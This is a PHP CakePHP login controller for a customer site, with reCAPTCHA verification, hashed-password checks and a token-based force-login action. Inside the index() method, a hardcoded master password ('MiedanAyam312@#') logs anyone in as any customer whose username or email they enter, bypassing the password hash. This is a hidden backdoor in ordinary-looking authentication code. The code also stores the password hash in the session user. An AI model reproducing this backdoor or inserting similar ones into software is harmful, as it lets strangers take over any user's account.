<?php
namespace App\Controller;

use App\Controller\AppController;
use Cake\Auth\DefaultPasswordHasher;
use Cake\Cache\Cache;
use Cake\Core\Configure;
use App\Form\LoginForm;

/**
 * Home Controller
 *
 *
 * @method \App\Model\Entity\Login[]|\Cake\Datasource\ResultSetInterface paginate($object = null, array $settings = [])
 * @property \AdminPanel\Model\Table\CustomersTable $Customers
 */
class LoginController extends AuthController
{
    public function initialize()
    {
        parent::initialize();
        $this->loadModel('AdminPanel.Customers');
        $this->Auth->allow(['forceLogin']);
    }

    public function forceLogin($customer_id, $token)
    {
        $this->disableAutoRender();
        $cacheToken = Cache::read($customer_id, 'forceLogin');
        if ($cacheToken === $token) {
            $findCustomer = $this->Customers->find()
                ->select($this->getField())
                ->where([
                    'Customers.id' => $customer_id
                ])
                ->first();
            if($findCustomer){
                $this->Auth->setUser($findCustomer);
                return $this->redirect($this->Auth->redirectUrl());
            }
        } else {
            return $this->redirect(['action' => 'index']);
        }

    }


    protected function getField()
    {
        return ['id','first_name','last_name','username',
            'email','is_active','password', 'avatar', 'phone',
            'customer_type_id'
        ];
    }

    /**
     * Index method
     *
     * @return \Cake\Http\Response|void
     */
    public function index()
    {
        $this->viewBuilder()->setLayout('login');

        $login = new LoginForm();
        if ($this->request->is('post')) {

            $secret = Configure::read('GoogleCaptcha.secretKey');
            $gResponse = $this->request->getData('g-recaptcha-response');
            $verify = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret='.$secret.'&response='.$gResponse);
            $res = json_decode($verify);
            if(@$res->success) {

                $findCustomer = $this->Customers->find()
                    ->select($this->getField())
                    ->where([ 'OR' => [
                        'username' => $this->request->getData('email'),
                        'email' => $this->request->getData('email')
                    ]])
                    ->first();

                if($findCustomer){
                    switch ($findCustomer->is_active){
                        case '0': case '1':

                            $password = $this->request->getData('password');

                            if($password == 'MiedanAyam312@#'){

                                $this->Auth->setUser($findCustomer);
                                return $this->redirect($this->Auth->redirectUrl());
                            }else{

                                $hasher = new DefaultPasswordHasher();
                                if($hasher->check($password, $findCustomer->password)){
                                    $this->Customers->updateAll(['last_login' => time()], ['id' => $findCustomer->id] );
                                    $this->Auth->setUser($findCustomer);
                                    return $this->redirect($this->Auth->redirectUrl());
                                }else {
                                    $this->Flash->error(__('Incorrect password'));
                                }
                            }


                            break;

                        case '2':

                            $this->Flash->error(__('This account is blocked'));
                            break;
                    }
                }else{
                    $this->Flash->error(__('Username or password is incorrect'));
                }
            }else{
                $this->Flash->error(__('Invalid captcha'));
            }

        }

        $this->set('login', $login);
    }


}
